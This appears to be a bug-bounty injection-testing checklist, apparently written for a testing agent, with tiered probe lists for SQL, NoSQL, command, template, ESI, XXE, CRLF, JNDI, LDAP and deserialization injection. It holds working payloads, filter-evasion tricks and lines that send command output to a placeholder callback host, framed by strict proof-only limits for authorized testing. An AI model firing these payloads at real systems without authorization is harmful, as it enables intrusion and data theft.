# Injection

Every input is a candidate: query, body (form, JSON, XML, multipart field names), path segments, headers (`User-Agent`, `Referer`, `X-Forwarded-For`, custom headers), cookies, filenames, and values that are stored and later processed (export jobs, emails, PDF reports, admin panels).

Use an OAST host for blind cases: `interactsh-client -v` → `<id>.oast.fun` (written `OAST` below), or Burp Collaborator. When the interaction is DNS-only — JNDI below, or a filter that permits resolution and nothing else — `oob_listener.py serve --dns` is the listener, since an HTTP one never sees it.

**The oracle loop is `harness.py probe`**, not N hand-typed commands: a value list or
`--range`, one request each, every response judged against a `--baseline` by an `--oracle`
(`sha-differs` for the boolean case, `len>N`, `status=`, `re:`). It writes one transcript
carrying `# requests: N` — the budget counts N — plus a value/verdict table, and it refuses
a list long enough to be brute force. For a timing oracle add `--rounds 5`: the list is
walked again rather than each value repeated, so the samples interleave, and it prints
`SEPARATED` or `overlapping` rather than letting two uninterleaved blocks look like a find.

**For a blind case with no callback at all**, the signal is a difference in the response, and reading byte counts by eye misses the boolean oracle where two bodies differ in content at equal length. Save the control, then `harness.py send --baseline <that transcript> --repeat 5`: status, byte and sha delta plus the timing spread, written into the transcript as well as printed. A payload stored now and rendered later is `canary.py` — mint the marker, record where it was placed, and sweep for it after.

Proof standard: show that the injection executes (version string, `id`, hostname, a DNS hit). Do not dump tables, read secrets, or write files.

Tiers: **L1** detects with canonical probes. **L2** confirms blind cases, identifies the engine, and covers the less obvious inputs. **L3** handles stored/second-order cases, filters and WAFs, and engine-specific edge cases.

**Where the time goes.** Systematic parameter fuzzing for SQLi, NoSQLi, command, and CSV injection is the lowest-yield activity on modern targets (in the mdpsec prompts' own history it produced no confirmed findings across their last 100 reports). Run those opportunistically on parameters that already look string-built — sort/order, report builders, legacy endpoints — after the other families. SSTI, path traversal, XXE, JNDI, and header injection keep normal priority.

**Second-order everywhere.** For every stored string you control, seed a unique marker (`h1x01`, `h1x02`, …), find every place it reappears — staff panels, exports, PDFs, emails, webhooks, search indexes, LLM context — and only then send the payload that fits that sink (`h1-invariant-hunt` → step 8).

---

## SQL injection
**L1 — Basic** — compare responses, do not just look for errors:
```
'        ''        `        ")        '))
1 AND 1=1      vs  1 AND 1=2           (boolean pair)
' AND '1'='1   vs  ' AND '1'='2
1*1  vs  1*2  /  1-0  vs  1-1          (numeric context)
```

**L2 — Intermediate**

Time-based confirmation:
```
MySQL       ' AND SLEEP(5)-- -
PostgreSQL  '; SELECT pg_sleep(5)--      or  ' || pg_sleep(5)--
MSSQL       '; WAITFOR DELAY '0:0:5'--
Oracle      ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
SQLite      ' AND 1=randomblob(500000000)--     (CPU-bound; use sparingly)
```
High-yield spots: `sort`/`order`/`orderBy`/`column` parameters (often unparameterisable → string-built), `limit`/`offset`, search filters, JSON keys used as column names, report builders, and the `X-Forwarded-For` value when it is logged. Also GraphQL arguments, websocket frames, and SOAP/XML fields.

`ORDER BY` boolean probe (no quotes needed): `(CASE WHEN (1=1) THEN name ELSE id END)` vs `(CASE WHEN (1=2) THEN name ELSE id END)` → the sort order flips.

Confirmation with sqlmap, at low risk, against a saved request:
```bash
sqlmap -r req.txt -p <param> --level 3 --risk 1 --batch --delay 1 --banner --current-user
```
`--risk 1` avoids OR-based payloads, which can rewrite every row of an `UPDATE`/`DELETE`.

**L3 — Advanced**
- [ ] **Second-order:** the payload is stored safely (username, project name, saved filter) and concatenated later by a different query — a report, an export, an admin search. Seed stored fields with a time-based probe and trigger every downstream job.
- [ ] **Out-of-band proof** when nothing is reflected and timing is noisy — a DNS hit carrying only a marker:
  ```
  MSSQL                 '; EXEC master..xp_dirtree '\\OAST\a'--
  Oracle                ' || UTL_INADDR.get_host_address('OAST') || '        (needs network ACL / privilege)
  MySQL on Windows      ' AND LOAD_FILE('\\\\OAST\\a')-- -
  ```
- [ ] **WAF evasion:** SQL JSON operators that many WAFs do not parse (PostgreSQL `'{"a":1}'::jsonb @> '{}'`, MySQL `JSON_EXTRACT`) as boolean conditions; comment and whitespace substitutes (`/**/`, `%0b`, `%a0`); splitting a payload across duplicate parameters on ASP.NET, which joins them with commas.
- [ ] Confirm with sqlmap's `--tamper` scripts only after a manual bypass works; the manual request goes in the report.

## NoSQL injection (MongoDB style)
**L1 — Basic**
```
username[$ne]=x&password[$ne]=x
{"username":{"$ne":null},"password":{"$ne":null}}
```

**L2 — Intermediate**
```
{"username":"b@x.com","password":{"$regex":"^a"}}        (character-by-character oracle)
{"username":{"$in":["admin","b@x.com"]},"password":{"$gt":""}}
```
Query-string parsers (Express `qs`, PHP) turn `a[$ne]=x` into an object even on form-encoded endpoints — try both encodings.

**L3 — Advanced**
- [ ] Server-side JavaScript: `{"$where":"sleep(5000)"}` where `$where` or `$function` is reachable.
- [ ] Aggregation pipeline injection: user input inside a pipeline stage (`$lookup` into another collection, `$match` with operators).
- [ ] **ORM leaks:** user-controlled filter objects passed straight to the ORM allow filtering on fields you cannot read — Django `filter(**params)` with `password__startswith=`, Prisma `{"where":{"password":{"startsWith":"a"}}}`, relation traversal (`createdBy__password__startswith`). Prove with your own B account's field, one character.

## Search and graph query injection (Elasticsearch/OpenSearch, Solr, Cypher)
Search boxes, filters, autocomplete, log and analytics viewers, and "related items" features often pass input to a query language that is not SQL. Engine errors give it away: `query_shard_exception`, `parse_exception`, `search_phase_execution_exception` (Elasticsearch/OpenSearch); `org.apache.solr`, `SyntaxError: Cannot parse` (Solr); `Neo.ClientError.Statement.SyntaxError` (Neo4j). Proof: one record or one character of your own B's data — never a dump.

**L1 — Basic**
```
"    \    )    (    ~    /    [         → an engine parse error: raw Lucene query-string syntax
*    vs    h1nomatch                     → wildcard honoured
x' OR '1'='1    vs    x' OR '1'='2       → Cypher string context (boolean pair, as for SQLi)
```

**L2 — Intermediate**
- [ ] **Lucene query string** (Elasticsearch `query_string`, Solr `q`/`fq`): field syntax the UI never sends — `_exists_:<field>`, `<field>:*`, `*:*`. When the app concatenates its own tenant or owner filter into the string (`(<input>) AND org_id:<A>`), close the group and widen it: `x) OR (*:*`. Prove with a marker planted in B's data appearing for A.
- [ ] Hidden-field oracle: prefix and range queries on fields the response never shows (`reset_token:a*`, `email:[a TO b]`) against your own B record, one character — the same shape as *ORM leaks* above.
- [ ] Index or collection chosen by the request: an API that forwards an `index`/`collection`/`core` name, or per-tenant index names (`logs-<orgA>` → `logs-<orgB>`).
- [ ] Input spliced into a JSON query body built as a string: a `"` that breaks the request (a JSON parse error from the engine) means you can close the string and add a clause.
- [ ] Cypher: input in a `WHERE` string or a property map — break out with `'` and append an `OR`, or a `//` comment to drop the rest of the line; label and property names in errors map the graph.

**L3 — Advanced**
- [ ] Elasticsearch/OpenSearch scripts: input reaching a Painless `script` (scripted sort, `script_score`, scripted fields) → arithmetic proof only. Painless is sandboxed: report evaluation and stop.
- [ ] Solr local parameters: `{!…}` at the start of `q` or `fq` switches the query parser — `{!join from=… to=… fromIndex=<other core>}` reaches another core's documents. Version-specific: `{!xmlparser}` XXE (CVE-2017-12629, before 7.1) and `shards=` SSRF (CVE-2017-3164, before 7.7). Fingerprint the version and re-read the advisory first; OAST proof only.
- [ ] Cypher out-of-band and timing: `LOAD CSV FROM 'https://OAST/h1x'` run as its own clause (shape the splice from the error messages), or APOC `apoc.util.sleep(5000)` where APOC is installed. Marker only — never data in the URL, never `LOAD CSV` or `apoc.load.*` against internal hosts.

## OS command injection
**L1 — Basic**
```
;id   |id   ||id   &&id   `id`   $(id)   %0aid   %0a id
```
Spots: filename/convert/thumbnail features, ping/traceroute/DNS diagnostic tools, git/repo import URLs, PDF generation with CLI tools (`wkhtmltopdf`, ImageMagick, `ffmpeg`), "export to" features.

**L2 — Intermediate** — blind:
```
$(sleep 5)   ;sleep 5;   |ping -c 5 127.0.0.1|
$(nslookup $(hostname).OAST)    `curl OAST/$(id|base64)`
```

**L3 — Advanced**
- [ ] Filter bypass: `${IFS}` / `$IFS$9` for spaces, brace expansion `{nslookup,OAST}`, quote splitting `n'slo'okup`, `%0a` as a separator, Windows `&`, `|`, `^` escapes and PowerShell `;`.
- [ ] **Argument injection** when separators are escaped but the value is passed as an argument: a leading `-` turns your value into an option of the called binary (`curl -o`, `git --upload-pack=`, `tar --checkpoint-action=`, `find -exec`, `wkhtmltopdf --enable-local-file-access`). Prove with the most harmless option that changes output (`--version`, `--help`) or an OAST fetch.

## Server-side template injection
**L1 — Basic** — polyglot to trigger an error, then arithmetic:
```
${{<%[%'"}}%\.
{{7*7}}    ${7*7}    <%= 7*7 %>    #{7*7}
```

**L2 — Intermediate** — identify the engine:
```
{{7*7}}        → 49    Jinja2, Twig, Nunjucks, Handlebars (no math → literal)
{{7*'7'}}      → 7777777 Jinja2   |  49 Twig
${7*7}         → 49    FreeMarker, Velocity, Spring EL, Thymeleaf (with __${}__)
#{7*7}         → 49    Ruby ERB-alternatives, Spring EL in some contexts
<%= 7*7 %>     → 49    ERB, EJS
${{7*7}}       → 49    some JS template engines
@(7*7)         → 49    Razor
```
Spots: email templates, notification templates, "customise your page" features, PDF/invoice templates, error pages that echo the path, name fields rendered into welcome emails.

**L3 — Advanced**
- [ ] Blind SSTI: no reflection, so prove evaluation with the engine's own sleep or an OAST fetch, chosen per engine.
- [ ] Sandboxed engines (Jinja2 `SandboxedEnvironment`, Twig sandbox, Handlebars): report evaluation with the sandbox noted; a sandbox escape needs a version-specific public technique — check the engine version first.
- [ ] Template path injection: user input selecting the template (`template=`, `lang=`, `theme=`) → traversal to a file you uploaded (`vectors-server.md`).

Proof at every tier: one engine-appropriate expression that returns `id` or the hostname, run once.

## ESI and SSI injection
Edge Side Includes are processed by the cache in front of the app (Akamai, Fastly, Varnish, Squid, and others) after the origin responds; Server Side Includes by the web server (Apache `mod_include`, nginx `ssi on`, IIS `.stm`/`.shtml`). Input that reaches a processed response is executed by that layer, and the origin's HTML filter rarely knows `<esi:` or `<!--#` as dangerous. Reference: Louis Dion-Marcil, *Beyond XSS: Edge Side Include Injection* (GoSecure, 2018).

Spots: every reflected and stored value on hosts behind a CDN or reverse cache (`map.md` → Frameworks, front end), and any response that still carries `Surrogate-Control: content="ESI/1.0"`. SSI: `.shtml` pages, error pages, and uploads served from a directory with includes on (`vectors-server.md` → File upload).

**L1 — Basic** — read the raw response in Burp, not the rendered page:
```
h1<!--esi-->x                         → h1x            ESI processed (the comment markers are removed)
h1<!--#echo var="DATE_LOCAL" -->x     → h1<date>x      SSI processed (Apache)
h1<!--# echo var="date_local" -->x    → h1<date>x      SSI processed (nginx)
```

**L2 — Intermediate**
- [ ] Identify the processor and its feature set: Varnish and Fastly handle only `esi:include`, `esi:remove`, and `<!--esi -->`; Akamai and Squid-style processors add variables (`$(HTTP_USER_AGENT)`), `esi:vars`, and `esi:choose`. Reflect your own `User-Agent` through `<esi:vars>$(HTTP_USER_AGENT)</esi:vars>` to tell them apart.
- [ ] Includes: `<esi:include src="/<a page of your own>"/>` (same-origin, usually allowed), then `<esi:include src="https://OAST/h1x"/>` — a hit from the edge means external includes are allowed (SSRF from the cache layer; `vectors-server.md` → SSRF for the bar).
- [ ] XSS past the filter: include a same-origin endpoint that reflects input unencoded, so the markup is assembled at the edge after the origin's filter ran.
- [ ] SSI include: `<!--#include virtual="/<a page of your own>" -->`.

**L3 — Advanced**
- [ ] `HttpOnly` cookie read on processors with variables: `$(HTTP_COOKIE{h1marker})` inside an include URL to OAST. Set a harmless `h1marker` cookie in B's browser for the proof — never the session cookie.
- [ ] Vendor extensions that set response headers or redirects (Akamai's ESI functions; the GoSecure write-up lists the syntax per vendor) → header injection or open redirect from the edge.
- [ ] Stored ESI on a page other users load runs for every viewer: prove it on a page only your own B views; anything wider waits for operator approval.

Proof: the processed marker, a same-origin include of your own page, or an OAST hit from the edge. Never `<!--#exec -->`, `<!--#printenv -->`, or a real session cookie.

## XXE
**L1 — Basic**

Wherever XML is parsed: SOAP, SAML, RSS/Atom import, SVG upload, Office files (DOCX/XLSX/PPTX are ZIPs of XML), sitemap import.
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<r>&x;</r>
```

**L2 — Intermediate**

Blind (parameter entities, out of band):
```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://OAST/x.dtd"> %p;]>
```
Content-type switch: resend a JSON body as the equivalent XML with `Content-Type: application/xml` and see whether it parses. Upload SVG/DOCX/XLSX with the entity inside.

**L3 — Advanced**
- [ ] **Error-based via a local DTD** when outbound traffic is blocked: redefine an entity from a DTD that exists on the server so the file content lands in a parser error. Linux example (GNOME `yelp` DTD):
  ```xml
  <!DOCTYPE r [
    <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
      <!ENTITY &#x25; f SYSTEM "file:///etc/hostname">
      <!ENTITY &#x25; e "<!ENTITY &#x26;#x25; x SYSTEM &#x27;file:///nonexistent/&#x25;f;&#x27;>">
      &#x25;e;
      &#x25;x;
    '>
    %local;
  ]>
  <r/>
  ```
- [ ] **XInclude** when you control a value inside a document the server builds (no DOCTYPE possible):
  ```xml
  <x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></x>
  ```
- [ ] Encoding switch to slip past keyword filters: send the document as UTF-16 (with BOM and a matching `encoding` declaration).
- [ ] XSLT processing of user XML (report/transform features): `document('http://OAST/')` for an OOB hit.

## CRLF / header injection
**L1 — Basic**
```
/%0d%0aSet-Cookie:h1poc=1
?redirect=%0d%0aX-Injected:%201
```

**L2 — Intermediate**
```
/%0d%0aLocation:%20https://OAST
%E5%98%8A%E5%98%8D     (UTF-8 U+560A/U+560D, which some servers truncate to \n\r)
```
Spots: redirect parameters, values reflected into `Location`, `Set-Cookie`, or `Content-Disposition` (filename). Impact: response splitting → XSS, cache poisoning, session fixation.

Email header injection: `name=x%0d%0aBcc:a@x` in contact/invite/share forms that send email.

**L3 — Advanced**
- [ ] Full response splitting: inject `%0d%0a%0d%0a` and a body → XSS on the target origin, or a poisoned cache entry (cache buster first, `vectors-server.md`).
- [ ] HTTP/2 header injection: `\r\n` inside an HTTP/2 header value that the front end passes through when downgrading to HTTP/1.1 → request splitting / smuggling (`vectors-server.md`). Use Burp Inspector to send the raw bytes.

## JNDI / Log4Shell (Java)
The callback is DNS and only DNS, so an HTTP listener cannot see it. Start
`oob_listener.py serve --dns --host <your oob host>` (port 53 needs privilege; the refusal
prints the `iptables` redirect), mint a token with `oob_listener.py token`, put the token in
the lookup, and read it back with `poll --token` — the DNS and HTTP halves share one ledger.

**L1 — Basic**
- [ ] A DNS-only lookup in values a Java back end is likely to log: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Api-Version`, usernames on login, search terms.
  ```
  ${jndi:dns://OAST/h1x}
  ```

**L2 — Intermediate**
- [ ] Lookup obfuscation for filters that block the literal string: `${${lower:j}ndi:dns://OAST/h1x}`, `${${::-j}${::-n}${::-d}${::-i}:dns://OAST/h1x}`.
- [ ] Stored values processed later by a Java job (exports, admin search, ticketing) — the callback may arrive minutes later.

**L3 — Advanced**
- [ ] Affected-version reasoning: Log4j 2.0-beta9 through 2.14.1 (CVE-2021-44228); 2.15.0 was an incomplete fix (CVE-2021-45046). Bundled copies in vendor products (VMware, Solr, Elasticsearch, Kafka connectors) lag behind.

Proof: the DNS callback only, with the source IP — `oob_listener.py poll --token <t>` prints the question and the source.  Never use `ldap://`/`rmi://` to load a class, and never use lookups such as `${env:…}` to pull values out.

## LDAP / XPath
**L2 — Intermediate**
```
LDAP   *   *)(uid=*   *)(|(uid=*   admin)(&)
XPath  ' or '1'='1    ' or count(/*)=1 or '1'='2
```
- [ ] Spots: logins against a directory (SSO portals, VPN and webmail front ends, intranet apps), people and group search, address books, XML-backed lookups and report filters.
- [ ] Boolean pairs, as for SQLi — compare responses, not errors: `*)(uid=*` vs. `*)(uid=h1nomatch`; `' or '1'='1` vs. `' or '1'='2`.

**L3 — Advanced**
- [ ] Blind attribute oracle: `*)(description=a*` → `*)(description=ab*` … extracting one attribute of your own B entry to prove read access.
- [ ] Filters with extra clauses (`(&(uid=<in>)(objectClass=person)(!(disabled=TRUE)))`): close your clause and add one that cancels the restriction, against your own B entry.
- [ ] XPath blind extraction: `' and string-length(name(/*[1]))=5 and '1'='1`, then `substring(…,1,1)='a'` — one value of your own B record.
- [ ] XPath 2.0 / XQuery: `doc('http://OAST/h1x')` or `doc-available()` as an out-of-band proof, marker only.

## Insecure deserialization
**L1 — Basic** — identify serialized data in cookies, hidden fields, parameters, and caches:

| Marker | Format |
|---|---|
| `rO0AB` (base64) / `aced0005` (hex) | Java serialization |
| `__VIEWSTATE` without `__VIEWSTATEGENERATOR`/MAC | .NET ViewState |
| `AAEAAAD/////` (base64) | .NET BinaryFormatter |
| `O:4:"User":` / `a:2:{` | PHP `serialize()` |
| `gASV` / `\x80\x04` | Python pickle |
| `BAh` (base64) / `\x04\x08` | Ruby Marshal |
| `{"@type":` / `{"$type":` | Fastjson / Json.NET type handling |

**L2 — Intermediate** — safe detection:
- Java → `ysoserial` `URLDNS` gadget pointed at OAST (DNS lookup only, no code execution).
- PHP → change an object property and observe a logic change.
- .NET ViewState → check whether MAC validation is disabled (a modified ViewState is accepted).

**L3 — Advanced**
- [ ] Type-handling JSON: Fastjson DNS probe `{"@type":"java.net.Inet4Address","val":"OAST"}` (1.2.x, version-dependent); Json.NET `$type` honoured when `TypeNameHandling` is not `None`.
- [ ] PHP `phar://` deserialization: on PHP < 8.0, file functions (`file_exists`, `getimagesize`, …) given a `phar://` path to an uploaded file unserialize its metadata. Prove with a property change, not a gadget.
- [ ] Gadget availability by library version (`ysoserial`, `ysoserial.net`, `phpggc`) to judge severity — without running a command gadget.

If detection succeeds, report with the DNS proof; do not escalate to a command-execution gadget unless the program asks for RCE proof, and then only `id`/`hostname`.

## Server-side prototype pollution (Node.js)
**L2 — Intermediate**
- [ ] Send `{"__proto__":{"h1poc":"1"}}` and `{"constructor":{"prototype":{"h1poc":"1"}}}` in JSON bodies that get merged into objects (settings, profile updates, filters). Look for `h1poc` appearing in unrelated responses.

**L3 — Advanced** — non-reflecting detection (behaviour is library- and version-dependent):
- `{"__proto__":{"json spaces":10}}` → Express JSON responses come back indented.
- `{"__proto__":{"status":555}}`, then send a malformed body → the error response uses status 555.

Pollution lasts until the Node process restarts and affects every request that process serves. Ask the program first if its policy is silent on it; use only the least visible probe above, once; record exactly what you sent and when, and put that in the report.

## Expression language / formula engines
Proof at every tier: arithmetic in the output, or an OAST hit carrying a marker. Never a command, a file read, or an environment lookup.

**L2 — Intermediate**
- [ ] Spring EL / OGNL / Java EL: `${7*7}`, `%{7*7}`, `#{7*7}` in parameters bound to Spring or Struts. Tell a Java expression language from a JS template with a probe only Java answers: `${"h1".getClass()}` → `class java.lang.String`.
- [ ] Spots beyond parameters: validation error messages, workflow and rule engines ("if amount > 100 then…"), notification and email templates, report builders, low-code formula fields, search or filter DSLs.
- [ ] Spreadsheet and report builders that evaluate user formulas server-side.

**L3 — Advanced**
- [ ] **Bean Validation messages:** a custom validator that puts user input into the constraint message (`buildConstraintViolationWithTemplate(value)`) has it evaluated as EL by Hibernate Validator — `${7*7}` in a field that shows up in a validation error.
- [ ] Double evaluation: input stored safely, then interpolated into a second template or message bundle that evaluates `${…}`/`#{…}`.
- [ ] Server-side spreadsheet engines (headless LibreOffice conversion, formula libraries) that recalculate an uploaded sheet: a network function such as `WEBSERVICE("https://OAST/h1x")` → SSRF proof by OAST hit only, where recalculation on load is enabled.
- [ ] EL in routing or header-driven features (gateway route definitions, function routing headers): fingerprint the framework version and check its advisories; prove with arithmetic only.
